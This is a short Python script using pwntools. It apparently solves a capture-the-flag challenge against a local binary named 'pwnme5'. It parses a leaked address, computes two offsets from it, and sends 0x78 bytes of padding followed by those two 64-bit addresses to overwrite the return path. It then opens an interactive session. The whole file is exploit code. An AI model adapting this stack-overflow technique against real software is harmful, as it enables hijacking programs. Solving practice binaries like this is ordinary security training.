from pwn import *

context.arch = "amd64"
b = process('./pwnme5')

leak = b.recvline()
while b'0x' not in leak:
    print(f"[DEBUG] Skipping line: {leak}")
    leak = b.recvline()

leak = int(leak.strip().split()[-1], 16)

bananaFart = leak - 26      
balls = leak - 42           

banana = b'A' * 0x78

b.sendline(banana + p64(balls) + p64(bananaFart))
b.interactive()